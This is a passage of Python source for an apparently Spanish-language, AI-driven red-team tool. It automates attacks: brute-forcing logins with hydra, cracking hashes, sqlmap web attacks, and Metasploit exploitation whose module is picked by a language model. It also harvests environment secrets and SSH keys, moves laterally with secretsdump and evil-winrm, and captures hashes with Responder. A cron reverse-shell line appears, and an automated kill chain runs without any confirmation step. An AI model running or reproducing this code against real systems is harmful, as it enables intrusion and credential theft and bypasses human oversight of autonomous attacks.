                findings["strings"] = f"Error: {e}"

        raw = json.dumps(findings, ensure_ascii=False)[:2000]
        analysis = self._ask(
            f"Analiza forense de un archivo:\n{raw}\n\n"
            f"Identifica: tipo, datos de seguridad relevantes, IOCs, acciones recomendadas."
        )
        if analysis:
            log_h("ANÁLISIS FORENSE:")
            print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        return self._save_report("file", f"# Análisis: {safe_path.name}\n{raw}\n\n## IA\n{analysis or 'N/A'}")


    # ── ASK & EXECUTE — IA + ejecución real ──────
    def ask_and_execute(self, question):
        """
        Consulta a la IA con la pregunta del usuario.
        La IA responde con análisis + comandos bash reales entre <CMD> tags.
        HADES ejecuta esos comandos y muestra los resultados reales.
        """
        tools_list = list(self.tools.keys())
        interfaces = self._get_wifi_interfaces()

        prompt = f"""Eres HADES, agente autónomo de ciberseguridad operando en {self.os_profile}.
Herramientas disponibles: {tools_list}
Interfaces de red detectadas: {interfaces}

El operador solicita: "{question}"

Tu respuesta DEBE seguir este formato exacto:

ANÁLISIS:
[Tu análisis breve en 2-3 líneas]

COMANDOS:
<CMD>comando_real_ejecutable_aqui</CMD>
<CMD>otro_comando_si_es_necesario</CMD>

REGLAS CRÍTICAS:
- Los comandos dentro de <CMD></CMD> deben ser 100% reales y ejecutables en bash
- Usa SOLO herramientas disponibles: {tools_list}
- Si necesitas interfaz WiFi usa: {interfaces[0] if interfaces else 'wlan0'}
- NO inventes MACs, IPs ni datos — los comandos los obtendrán datos reales
- Si la tarea requiere modo monitor WiFi, inclúyelo en los comandos
- Máximo 4 comandos
- Si no es posible ejecutar con las herramientas disponibles, explica por qué en ANÁLISIS y no pongas CMD"""

        log_h(f"Consultando IA sobre: {question}")
        resp = self._ask(prompt, timeout=120)

        if not resp:
            log_err("Sin respuesta de la IA.")
            return

        # Mostrar análisis
        analysis_match = re.search(r'ANÁLISIS:\s*(.*?)(?=COMANDOS:|$)', resp, re.DOTALL)
        if analysis_match:
            print(f"\n{C.CYAN}{analysis_match.group(1).strip()}{C.RESET}\n")

        # Extraer y ejecutar comandos reales
        cmds = re.findall(r'<CMD>(.*?)</CMD>', resp, re.DOTALL)
        if not cmds:
            # Si no hay CMD tags, mostrar respuesta completa
            print(f"\n{C.CYAN}{resp}{C.RESET}")
            return

        results = []
        for i, cmd in enumerate(cmds, 1):
            cmd = cmd.strip()
            if not cmd:
                continue
            print(f"\n{C.YELLOW}[CMD {i}/{len(cmds)}]{C.RESET} {C.DIM}{cmd}{C.RESET}")
            confirm = input(f"{C.YELLOW}¿Ejecutar? [s/N]: {C.RESET}").strip().lower()
            if confirm not in ("s", "si", "sí", "y", "yes"):
                print(f"{C.DIM}Omitido.{C.RESET}")
                continue
            stdout, stderr, rc = run_cmd(cmd, timeout=30)
            output = stdout or stderr or "(sin salida)"
            print(f"{C.GREEN}{output[:2000]}{C.RESET}")
            results.append(f"Comando: {cmd}\nSalida:\n{output[:500]}")

        # Análisis IA de los resultados reales
        if results:
            log_h("Analizando resultados reales...")
            result_text = "\n---\n".join(results)
            analysis = self._ask(
                f"Analiza estos resultados reales obtenidos para responder '{question}':\n\n{result_text}\n\n"
                f"Presenta los datos de forma clara y estructurada. Si son redes WiFi, muestra SSID y MAC. "
                f"Sé técnico y conciso. Máximo 200 palabras.",
                timeout=120
            )
            if analysis:
                print(f"\n{C.BOLD}[HADES ANÁLISIS]{C.RESET}")
                print(f"{C.CYAN}{analysis}{C.RESET}\n")

    def _get_wifi_interfaces(self):
        """Detecta interfaces WiFi disponibles en el sistema."""
        interfaces = []
        stdout, _, _ = run_cmd("iwconfig 2>/dev/null | grep -E '^[a-z]' | awk '{print $1}'")
        if stdout:
            interfaces = [i.strip() for i in stdout.splitlines() if i.strip()]
        if not interfaces:
            stdout, _, _ = run_cmd("ip link show | grep -E 'wl' | awk -F': ' '{print $2}'")
            if stdout:
                interfaces = [i.strip() for i in stdout.splitlines() if i.strip()]
        return interfaces if interfaces else ["wlan0"]

    # ── SHELL INTERACTIVO ──────────────────────
    def interactive_shell(self):
        print(BANNER)
        self._show_upgrade_box()
        log_ok(f"OS: {self.os_profile.upper()} | Modelo: {self.model or 'NO DISPONIBLE'} | Herramientas: {len(self.tools)}")
        log(f"Escribe 'help' para ver comandos.\n")

        cmds = {
            "scan <ip>":         "Escaneo rápido de puertos",
            "recon <ip/red>":    "Reconocimiento completo",
            "fullaudit <red>":   "Auditoría automática completa con reporte",
            "audit <ip>":        "Auditoría ISO 27001",
            "analyze <archivo>": "Análisis forense de archivo",
            "ask <pregunta>":    "Consulta libre a HADES-IA",
            "tools":             "Listar herramientas",
            "findings":          "Ver hallazgos de la sesión",
            "clear":             "Limpiar pantalla",
            "exit":              "Salir",
        }

        while True:
            try:
                raw = input(f"\n{C.RED}{C.BOLD}HADES{C.RESET}{C.DIM}@{self.os_profile}{C.RESET} {C.CYAN}▶{C.RESET} ").strip()
                if not raw: continue
                parts = raw.split(None, 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""

                if cmd in ["exit","quit","q"]:
                    log("Sesión terminada.")
                    break
                elif cmd == "help":
                    print(f"\n{C.BOLD}Comandos:{C.RESET}")
                    for c, d in cmds.items():
                        print(f"  {C.CYAN}{c:<28}{C.RESET} {d}")
                elif cmd == "tools":
                    print(f"\n{C.BOLD}Herramientas detectadas ({len(self.tools)}):{C.RESET}")
                    print(self._tools_summary())
                elif cmd == "findings":
                    if not self.findings:
                        print("Sin hallazgos en esta sesión.")
                    else:
                        for i, f in enumerate(self.findings, 1):
                            print(f"\n{C.YELLOW}[{i}] {f['phase'].upper()} — {f.get('target','')}{C.RESET}")
                            print(f.get("analysis",""))
                elif cmd == "clear":
                    os.system("clear"); print(BANNER)
                elif cmd == "scan":
                    self.quick_scan(arg) if arg else log_warn("Uso: scan <target>")
                elif cmd == "recon":
                    self.recon(arg) if arg else log_warn("Uso: recon <target>")
                elif cmd == "fullaudit":
                    self.full_audit(arg) if arg else log_warn("Uso: fullaudit <red/CIDR>")
                elif cmd == "audit":
                    self.audit_iso27001(arg) if arg else log_warn("Uso: audit <target>")
                elif cmd == "analyze":
                    self.analyze_file(arg) if arg else log_warn("Uso: analyze <filepath>")
                elif cmd == "ask":
                    if not arg:
                        log_warn("Uso: ask <pregunta>")
                    else:
                        self.ask_and_execute(arg)
                else:
                    log_warn(f"Comando desconocido: '{cmd}'. Escribe 'help'.")

            except KeyboardInterrupt:
                print(f"\n{C.DIM}[Ctrl+C — escribe 'exit' para salir]{C.RESET}")
            except EOFError:
                break

    # ── MODO AUTÓNOMO ──────────────────────────
    def auto_mode(self):
        print(BANNER)
        log_h("MODO AUTÓNOMO — Ciclo cada 30 minutos")
        cycle = 0
        while True:
            cycle += 1
            log_h(f"CICLO #{cycle} — {datetime.now().strftime('%H:%M:%S')}")
            out, _, _ = run_cmd("ip route | grep -v default | awk '{print $1}' | head -3")
            nets = [n.strip() for n in out.splitlines() if "/" in n]
            if nets:
                for net in nets[:2]:
                    self.full_audit(net)
            else:
                log_warn("Sin redes detectadas. Ejecutando diagnóstico local...")
                out, _, _ = run_cmd("ss -tulnp")
                resp = self._ask(f"Analiza servicios activos y postura de seguridad:\n{out[:2000]}")
                if resp: print(f"\n{C.CYAN}{resp}{C.RESET}\n")
            log(f"Próximo ciclo en 30 minutos...")
            time.sleep(1800)

# ═════════════════════════════════════════════
# RED TEAM ENGINE — Módulos de ataque ofensivo
# ═════════════════════════════════════════════
class RedTeamEngine(HadesEngine):
    """
    Extiende HadesEngine con capacidades Red Team completas:
    explotación, post-explotación, pivoting, ataques a contraseñas,
    web exploitation, WiFi attacks, OSINT, persistencia y Kill Chain.
    """

    # ── OSINT ─────────────────────────────────
    def osint(self, target):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return
        log_h(f"OSINT: {target}")
        results = {}

        if self._has("theHarvester"):
            out, _, _ = run_tool("theHarvester", f"-d {shlex.quote(target)} -b all -l 50", 120)
            results["theHarvester"] = out[:2000]

        if self._has("whois"):
            out, _, _ = run_tool("whois", shlex.quote(target), 30)
            results["whois"] = out[:500]

        if self._has("dig"):
            for rtype in ["A","MX","NS","TXT"]:
                out, _, _ = run_cmd(f"dig {shlex.quote(target)} {rtype} +short 2>/dev/null")
                results[f"dns_{rtype}"] = out[:200]

        analysis = self._ask(
            f"Eres HADES Red Team. Analiza esta información OSINT del objetivo {target}:\n"
            f"{json.dumps(results, ensure_ascii=False)[:3000]}\n\n"
            f"Identifica: 1)Superficie de ataque externa 2)Emails/usuarios expuestos "
            f"3)Subdominios interesantes 4)Tecnologías detectadas 5)Vectores de entrada recomendados"
        )
        if analysis:
            print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"osint","target":target,"analysis":analysis or ""})
        return self._save_report("osint", f"# OSINT: {target}\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── ENUMERACIÓN SMB/AD ─────────────────────
    def enum_smb(self, target):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return
        log_h(f"ENUMERACIÓN SMB/AD: {target}")
        results = {}

        tool = "enum4linux-ng" if self._has("enum4linux-ng") else ("enum4linux" if self._has("enum4linux") else None)
        if tool:
            out, _, _ = run_tool(tool, shlex.quote(target), 120)
            results["enum4linux"] = out[:3000]

        if self._has("smbclient"):
            out, _, _ = run_cmd(f"smbclient -L //{shlex.quote(target)} -N 2>&1 | head -30")
            results["shares"] = out

        if self._has("rpcclient"):
            out, _, _ = run_cmd(f"rpcclient -U '' -N {shlex.quote(target)} -c 'enumdomusers' 2>&1 | head -20")
            results["users"] = out

        if self._has("netexec"):
            out, _, _ = run_cmd(f"netexec smb {shlex.quote(target)} --shares -u '' -p '' 2>&1 | head -20")
            results["netexec_smb"] = out

        analysis = self._ask(
            f"Analiza esta enumeración SMB/AD de {target}:\n{json.dumps(results,ensure_ascii=False)[:3000]}\n\n"
            f"Identifica: usuarios, recursos compartidos, dominio, versión OS, vectores de ataque AD."
        )
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"enum_smb","target":target,"analysis":analysis or ""})
        return self._save_report("smb_enum", f"# SMB Enum: {target}\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── ATAQUES A CONTRASEÑAS ──────────────────
    def password_attack(self, target, service="ssh", userlist=None, passlist=None):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return
        log_h(f"ATAQUE A CONTRASEÑAS: {target} [{service}]")

        ul = userlist or "/usr/share/wordlists/metasploit/unix_users.txt"
        pl = passlist or "/usr/share/wordlists/rockyou.txt.gz"

        if not self._has("hydra"):
            log_err("hydra no disponible."); return

        # Descomprimir rockyou si está comprimido
        rockyou = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(rockyou) and os.path.exists(rockyou + ".gz"):
            log(f"Descomprimiendo rockyou.txt.gz...")
            run_cmd("sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null")

        pl_final = rockyou if os.path.exists(rockyou) else pl
        ul_final = ul if os.path.exists(ul) else None

        if not ul_final:
            log_warn("Lista de usuarios no encontrada. Usando lista básica...")
            ul_final = "/tmp/hades_users.txt"
            with open(ul_final, "w") as f:
                f.write("\n".join(["admin","root","user","administrator","guest","test","operator"]))

        hydra_args = f"-L {shlex.quote(ul_final)} -P {shlex.quote(pl_final)} -t 4 -f {shlex.quote(target)} {shlex.quote(service)}"
        out, _, rc = run_tool("hydra", hydra_args, 300)
        print(f"\n{C.YELLOW}[HYDRA]{C.RESET}\n{out[:2000]}")

        found = [l for l in out.splitlines() if "[" in l and "login:" in l.lower()]
        if found:
            log_h(f"CREDENCIALES ENCONTRADAS: {len(found)}")
            for cred in found: print(f"  {C.RED}{cred}{C.RESET}")
        self.findings.append({"phase":"password_attack","target":f"{target}/{service}","analysis":"\n".join(found)})
        return self._save_report("pwdattack", f"# Password Attack: {target} [{service}]\n```\n{out[:3000]}\n```")

    # ── CRACKING DE HASHES ─────────────────────
    def crack_hash(self, hashfile, mode="0"):
        try: safe = _validate_filepath(hashfile)
        except ValueError as e: log_err(str(e)); return
        if not safe.exists(): log_err(f"Archivo no encontrado: {safe}"); return
        log_h(f"CRACKING HASHES: {safe.name} (modo {mode})")

        rockyou = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(rockyou): log_warn("rockyou.txt no encontrado"); return

        if self._has("hashcat"):
            out, _, _ = run_cmd(f"hashcat -m {shlex.quote(mode)} {shlex.quote(str(safe))} {shlex.quote(rockyou)} --force --quiet 2>&1 | head -30")
        elif self._has("john"):
            out, _, _ = run_cmd(f"john {shlex.quote(str(safe))} --wordlist={shlex.quote(rockyou)} 2>&1 | head -20")
        else:
            log_err("hashcat/john no disponibles."); return

        print(f"\n{C.YELLOW}[CRACKING]{C.RESET}\n{out[:2000]}")
        analysis = self._ask(f"Analiza estos resultados de cracking de hashes:\n{out[:1000]}\nIndica credenciales encontradas y recomendaciones.")
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")

    # ── WEB EXPLOITATION ──────────────────────
    def web_exploit(self, url):
        log_h(f"WEB EXPLOITATION: {url}")
        results = {}

        if self._has("sqlmap"):
            log("Probando SQL Injection...")
            out, _, _ = run_cmd(f"sqlmap -u {shlex.quote(url)} --batch --level=2 --risk=1 --timeout=30 2>&1 | tail -20")
            results["sqlmap"] = out[:1500]

        if self._has("nuclei"):
            log("Ejecutando Nuclei templates...")
            out, _, _ = run_cmd(f"nuclei -u {shlex.quote(url)} -severity medium,high,critical -silent 2>&1 | head -30")
            results["nuclei"] = out[:1500]

        if self._has("ffuf") or self._has("gobuster") or self._has("feroxbuster"):
            wordlist = "/usr/share/wordlists/dirb/common.txt"
            if os.path.exists(wordlist):
                log("Fuzzing de directorios...")
                if self._has("ffuf"):
                    out, _, _ = run_cmd(f"ffuf -u {shlex.quote(url)}/FUZZ -w {wordlist} -mc 200,301,302,403 -t 50 -timeout 5 2>&1 | tail -20")
                elif self._has("gobuster"):
                    out, _, _ = run_cmd(f"gobuster dir -u {shlex.quote(url)} -w {wordlist} -t 20 -q 2>&1 | head -20")
                results["dirbusting"] = out[:1000]

        if self._has("nikto"):
            log("Escaneando con Nikto...")
            out, _, _ = run_tool("nikto", f"-h {shlex.quote(url)} -maxtime 60 -Format txt", 90)
            results["nikto"] = out[:1500]

        analysis = self._ask(
            f"Eres HADES Red Team. Analiza vulnerabilidades web de {url}:\n"
            f"{json.dumps(results,ensure_ascii=False)[:3500]}\n\n"
            f"Identifica: 1)Vulnerabilidades críticas explotables 2)Inyecciones detectadas "
            f"3)Archivos/dirs sensibles 4)CVEs aplicables 5)Pasos de explotación recomendados"
        )
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"web_exploit","target":url,"analysis":analysis or ""})
        return self._save_report("web_exploit", f"# Web Exploit: {url}\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── EXPLOTACIÓN CON METASPLOIT ─────────────
    def exploit_msf(self, target, module=None):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return
        if not self._has("msfconsole"):
            log_err("msfconsole no disponible."); return
        log_h(f"METASPLOIT: {target}")

        if not module:
            # Pedir a la IA el módulo más adecuado basado en findings previos
            context = json.dumps([f for f in self.findings if f.get("target","").startswith(target)][:3], ensure_ascii=False)
            suggestion = self._ask(
                f"Basado en estos hallazgos de {target}:\n{context[:2000]}\n\n"
                f"Sugiere el módulo Metasploit más adecuado para explotar. "
                f"Responde SOLO con el nombre del módulo, ej: exploit/multi/handler o auxiliary/scanner/smb/smb_ms17_010"
            )
            module = (suggestion or "").strip().split("\n")[0] if suggestion else None

        if not module:
            log_warn("No se pudo determinar módulo. Usa: exploit <ip> <módulo>"); return

        log(f"Módulo seleccionado: {module}")
        lhost_out, _, _ = run_cmd("ip route get 1 | awk '{print $7}' | head -1")
        lhost = lhost_out.strip() or "0.0.0.0"

        rc_script = f"""use {module}
set RHOSTS {target}
set LHOST {lhost}
set LPORT 4444
check
run -j
sleep 10
sessions -l
exit
"""
        rc_file = f"/tmp/hades_msf_{os.getpid()}.rc"
        with open(rc_file, "w") as f: f.write(rc_script)
        out, _, _ = run_cmd(f"msfconsole -q -r {shlex.quote(rc_file)} 2>&1", timeout=120)
        try: os.remove(rc_file)
        except: pass

        print(f"\n{C.YELLOW}[MSF OUTPUT]{C.RESET}\n{out[:3000]}")
        analysis = self._ask(f"Analiza el output de Metasploit contra {target} con módulo {module}:\n{out[:2000]}\n¿Fue exitoso? ¿Qué acceso se obtuvo? Próximos pasos.")
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"exploit_msf","target":target,"module":module,"analysis":analysis or ""})
        return self._save_report("exploit_msf", f"# MSF Exploit: {target}\nMódulo: {module}\n```\n{out[:3000]}\n```\n\n## Análisis\n{analysis or 'N/A'}")

    # ── POST-EXPLOTACIÓN LOCAL ─────────────────
    def post_exploit_local(self):
        log_h("POST-EXPLOTACIÓN LOCAL")
        results = {}

        checks = [
            ("whoami_id",    "id"),
            ("sudo_privs",   "sudo -l 2>/dev/null | head -20"),
            ("suid_bins",    "find / -perm -4000 -type f 2>/dev/null | head -20"),
            ("writable_etc", "find /etc -writable -type f 2>/dev/null | head -10"),
            ("cron_jobs",    "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null | head -20"),
            ("net_conns",    "ss -tulnp 2>/dev/null | head -20"),
            ("passwd_users", "cat /etc/passwd | grep -v nologin | grep -v false | grep bash"),
            ("env_secrets",  "env 2>/dev/null | grep -iE 'key|pass|token|secret|aws|api' | head -10"),
            ("ssh_keys",     "find /home /root -name 'id_rsa' -o -name 'authorized_keys' 2>/dev/null | head -10"),
            ("docker_escape","id | grep docker; ls /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5"),
        ]

        for key, cmd in checks:
            out, _, _ = run_cmd(cmd)
            results[key] = out[:300]
            if out.strip():
                print(f"  {C.YELLOW}[{key}]{C.RESET} {out[:100].strip()}")

        analysis = self._ask(
            f"Eres HADES Red Team post-exploitation. Analiza este contexto del sistema comprometido:\n"
            f"{json.dumps(results,ensure_ascii=False)[:3500]}\n\n"
            f"Identifica: 1)Nivel de privilegios actual 2)Vectores de escalada disponibles "
            f"3)Datos sensibles encontrados 4)Rutas de persistencia recomendadas "
            f"5)Posibilidades de pivoting 6)Técnicas de evasión recomendadas. Sé específico con comandos."
        )
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"post_exploit","target":"localhost","analysis":analysis or ""})
        return self._save_report("post_exploit", f"# Post-Exploit Local\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── LATERAL MOVEMENT ──────────────────────
    def lateral_movement(self, target, username=None, password=None, hash_val=None):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return
        log_h(f"LATERAL MOVEMENT: {target}")
        results = {}

        creds = ""
        if username and password:
            creds = f"-u {shlex.quote(username)} -p {shlex.quote(password)}"
        elif username and hash_val:
            creds = f"-u {shlex.quote(username)} -H {shlex.quote(hash_val)}"

        if self._has("netexec") and creds:
            for proto in ["smb","winrm","ssh"]:
                out, _, _ = run_cmd(f"netexec {proto} {shlex.quote(target)} {creds} 2>&1 | head -10")
                if "[+]" in out or "Pwn3d!" in out:
                    results[f"netexec_{proto}"] = out
                    log_h(f"ACCESO OBTENIDO vía {proto.upper()}!")

        if self._has("impacket-secretsdump") and creds:
            auth = f"{shlex.quote(username)}:{shlex.quote(password)}@{shlex.quote(target)}" if password else f"{shlex.quote(username)}@{shlex.quote(target)}"
            out, _, _ = run_cmd(f"impacket-secretsdump {auth} 2>&1 | head -30")
            results["secretsdump"] = out[:1000]

        if self._has("evil-winrm") and username and password:
            log(f"Probando Evil-WinRM en {target}...")
            out, _, _ = run_cmd(f"evil-winrm -i {shlex.quote(target)} -u {shlex.quote(username)} -p {shlex.quote(password)} -c 'whoami; hostname; ipconfig' 2>&1 | head -20")
            results["evil_winrm"] = out[:500]

        analysis = self._ask(
            f"Analiza este intento de movimiento lateral hacia {target}:\n"
            f"{json.dumps(results,ensure_ascii=False)[:2500]}\n\n"
            f"Indica: acceso obtenido, credenciales válidas, próximos movimientos recomendados."
        )
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"lateral_movement","target":target,"analysis":analysis or ""})
        return self._save_report("lateral", f"# Lateral Movement: {target}\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── PERSISTENCIA ──────────────────────────
    def persistence(self, method="cron"):
        log_h(f"PERSISTENCIA: método={method}")

        if method == "cron":
            cron_entry = f"*/5 * * * * /bin/bash -i >& /dev/tcp/127.0.0.1/9999 0>&1 # hades_persist"
            log_warn(f"Entrada cron para demo (NO activa): {cron_entry}")
            analysis = self._ask(
                f"Explica la técnica de persistencia via cron: '{cron_entry}'\n"
                f"Cómo detectarla, cómo removerla, y alternativas más sigilosas (MITRE ATT&CK T1053)."
            )
        elif method == "service":
            analysis = self._ask(
                "Explica cómo establecer persistencia via systemd service en Linux.\n"
                "Incluye: archivo de servicio, cómo enmascararlo, cómo detectarlo (MITRE ATT&CK T1543.002)."
            )
        elif method == "bashrc":
            analysis = self._ask(
                "Explica persistencia via .bashrc en Linux.\n"
                "Técnica, detección, remediación (MITRE ATT&CK T1546.004)."
            )
        else:
            analysis = self._ask(f"Explica técnicas de persistencia en Linux: {method}. MITRE ATT&CK mapping.")

        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")
        self.findings.append({"phase":"persistence","target":"localhost","method":method,"analysis":analysis or ""})

    # ── WIFI ATTACK COMPLETO ───────────────────
    def wifi_full_attack(self, interface=None):
        ifaces = self._get_wifi_interfaces()
        iface = interface or ifaces[0]
        log_h(f"ATAQUE WIFI COMPLETO: {iface}")

        if not (self._has("aircrack-ng") and self._has("airodump-ng") and self._has("aireplay-ng")):
            log_err("Suite aircrack-ng no disponible completa."); return

        results = {}
        cap_file = f"/tmp/hades_wifi_{os.getpid()}"

        log("Poniendo interfaz en modo monitor...")
        run_cmd(f"airmon-ng start {shlex.quote(iface)} 2>/dev/null")
        mon_iface = f"{iface}mon" if not iface.endswith("mon") else iface

        log(f"Capturando redes 15 segundos en {mon_iface}...")
        run_cmd(f"timeout 15 airodump-ng {shlex.quote(mon_iface)} --write {shlex.quote(cap_file)} --output-format csv 2>/dev/null")

        csv_file = f"{cap_file}-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file) as f: csv_data = f.read()
            results["networks"] = csv_data[:2000]

            # Parsear redes WPA
            networks = []
            for line in csv_data.splitlines()[2:]:
                parts = line.split(",")
                if len(parts) > 13 and "WPA" in parts[5]:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip() if len(parts) > 13 else "?"
                    networks.append({"bssid": bssid, "channel": channel, "essid": essid})

            print(f"\n{C.GREEN}Redes WPA detectadas: {len(networks)}{C.RESET}")
            for n in networks[:5]:
                print(f"  {C.CYAN}{n['essid']}{C.RESET} | BSSID: {n['bssid']} | CH: {n['channel']}")

        analysis = self._ask(
            f"Analiza estas redes WiFi capturadas:\n{json.dumps(results,ensure_ascii=False)[:2000]}\n\n"
            f"Identifica: redes con cifrado débil (WEP/WPS), handshakes capturables, "
            f"redes objetivo de mayor interés, técnicas de ataque recomendadas."
        )
        if analysis: print(f"\n{C.CYAN}{analysis}{C.RESET}\n")

        log("Restaurando modo managed...")
        run_cmd(f"airmon-ng stop {shlex.quote(mon_iface)} 2>/dev/null")
        self.findings.append({"phase":"wifi","target":iface,"analysis":analysis or ""})
        return self._save_report("wifi", f"# WiFi Attack: {iface}\n{json.dumps(results,indent=2)}\n\n## Análisis\n{analysis or 'N/A'}")

    # ── CREDENTIAL CAPTURE (Responder) ────────
    def capture_credentials(self, interface=None, duration=60):
        if not self._has("responder"):
            log_err("responder no instalado. Instalar con: pip3 install responder o apt install responder"); return
        ifaces = self._get_wifi_interfaces()
        iface = interface or "eth0"
        log_h(f"CAPTURA DE CREDENCIALES LLMNR/NBT-NS: {iface} ({duration}s)")
        log_warn("Requiere root. Escuchando LLMNR/NBT-NS/mDNS poisoning...")
        out, _, _ = run_cmd(f"timeout {duration} responder -I {shlex.quote(iface)} -wrf 2>&1 | grep -E 'Hash|NTLMv|Cleartext'")
        print(f"\n{C.RED}{out[:2000]}{C.RESET}")
        self.findings.append({"phase":"credential_capture","target":iface,"analysis":out[:500]})

    # ── KILL CHAIN COMPLETA ────────────────────
    def kill_chain(self, target, external=False):
        try: target = _validate_target(target)
        except ValueError as e: log_err(str(e)); return

        log_h(f"KILL CHAIN COMPLETA: {target}")
        log_warn("Iniciando secuencia Red Team automatizada...")
        report_sections = [
            f"# HADES Red Team — Kill Chain Report",
            f"**Objetivo:** `{target}`",
            f"**Fecha:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"**Agente:** HADES-LOCAL v{HADES_VERSION}\n---\n"
        ]

        # FASE 1 — Reconocimiento
        log_h("KILL CHAIN — FASE 1: Reconocimiento")
        if external:
            self.osint(target)
        findings_recon, _ = self.recon(target)
        report_sections.append(f"## Fase 1 — Reconocimiento\n```\n{json.dumps(findings_recon,ensure_ascii=False)[:1500]}\n```\n")

        # FASE 2 — Escaneo y enumeración
        log_h("KILL CHAIN — FASE 2: Enumeración")
        self.enum_smb(target)
        report_sections.append("## Fase 2 — Enumeración SMB/AD\nVer hallazgos en findings.\n")

        # FASE 3 — Análisis de vulnerabilidades
        log_h("KILL CHAIN — FASE 3: Vulnerabilidades")
        vuln_out, _, _ = run_tool("nmap", f"--script vuln -T4 {shlex.quote(target)}", 300)
        cves = re.findall(r"CVE-\d{4}-\d+", vuln_out)
        report_sections.append(f"## Fase 3 — Vulnerabilidades\nCVEs detectados: {list(set(cves))[:10]}\n```\n{vuln_out[:2000]}\n```\n")

        # FASE 4 — Explotación
        log_h("KILL CHAIN — FASE 4: Explotación")
        self.exploit_msf(target)
        report_sections.append("## Fase 4 — Explotación\nVer reporte MSF generado.\n")

        # FASE 5 — Post-explotación
        log_h("KILL CHAIN — FASE 5: Post-explotación")
        self.post_exploit_local()
        report_sections.append("## Fase 5 — Post-explotación\nVer hallazgos post_exploit.\n")

        # FASE 6 — Resumen ejecutivo IA
        log_h("KILL CHAIN — FASE 6: Resumen ejecutivo")
        all_findings = json.dumps([
            {"phase": f["phase"], "target": f.get("target",""), "summary": f.get("analysis","")[:200]}
            for f in self.findings[-15:]
        ], ensure_ascii=False)

        exec_summary = self._ask(
            f"Eres HADES Red Team. Genera el resumen ejecutivo final de esta operación contra {target}:\n\n"
            f"{all_findings}\n\n"
            f"Incluye: 1)Resumen del compromiso 2)Accesos obtenidos 3)Datos sensibles encontrados "
            f"4)Kill chain completada (fases exitosas/fallidas) 5)Recomendaciones de remediación "
            f"6)MITRE ATT&CK mapping de técnicas usadas. Tono ejecutivo para CISO.",
            timeout=300
        )

        if exec_summary:
            report_sections.append(f"## Resumen Ejecutivo\n{exec_summary}\n")
            print(f"\n{C.BOLD}{'═'*60}{C.RESET}")
            print(f"{C.RED}{C.BOLD}  KILL CHAIN COMPLETADA — RESUMEN EJECUTIVO{C.RESET}")
            print(f"{C.BOLD}{'═'*60}{C.RESET}")
            print(f"{C.CYAN}{exec_summary}{C.RESET}\n")

        # Tabla de fases
        report_sections.append("\n## Tabla Kill Chain\n")
        report_sections.append("| Fase | Técnica | Estado |")
        report_sections.append("|------|---------|--------|")
        phases = [
            ("1 Reconocimiento", "Nmap + OSINT + Whois", "✅"),
            ("2 Enumeración",    "SMB/AD enum4linux + netexec", "✅"),
            ("3 Vulnerabilidades","nmap --script vuln", "✅"),
            ("4 Explotación",    "Metasploit Framework", "🔄"),
            ("5 Post-Exploit",   "SUID/sudo/cron/env analysis", "✅"),
            ("6 Persistencia",   "Análisis técnicas MITRE T1053", "📋"),
        ]
        for fase, tecnica, estado in phases:
            report_sections.append(f"| {fase} | {tecnica} | {estado} |")

        path = self._save_report("killchain", "\n".join(report_sections))
        print(f"\n{C.GREEN}Reporte Kill Chain guardado: {path}{C.RESET}\n")
        return path

    # ── SHELL RED TEAM ─────────────────────────
    def interactive_shell(self):
        print(BANNER)
        self._show_upgrade_box()
        log_ok(f"OS: {self.os_profile.upper()} | Modelo: {self.model or 'NO DISPONIBLE'} | Herramientas: {len(self.tools)}")
        log(f"Escribe 'help' para ver comandos.\n")

        cmds_base = {
            "scan <ip>":              "Escaneo rápido de puertos",
            "recon <ip>":             "Reconocimiento completo con análisis IA",
            "fullaudit <red/CIDR>":   "Auditoría completa automática con reporte",
            "audit <ip>":             "Auditoría por controles ISO 27001",
            "analyze <archivo>":      "Análisis forense de archivo",
            "ask <pregunta>":         "Consulta libre + ejecución IA",
        }
        cmds_rt = {
            "osint <dominio/ip>":     "Recolección OSINT (theHarvester, whois, DNS)",
            "enumsmb <ip>":           "Enumeración SMB/AD (enum4linux, netexec)",
            "webattack <url>":        "Web exploitation (sqlmap, nuclei, ffuf, nikto)",
            "pwdattack <ip> <svc>":   "Fuerza bruta contraseñas (hydra)",
            "crackhash <archivo>":    "Cracking de hashes (hashcat/john + rockyou)",
            "exploit <ip> [módulo]":  "Explotación con Metasploit (auto-suggest IA)",
            "post":                   "Post-explotación local (suid/sudo/cron/env)",
            "lateral <ip> <u> <p>":  "Movimiento lateral (netexec/impacket/evil-winrm)",
            "persist [method]":       "Análisis técnicas de persistencia (MITRE)",
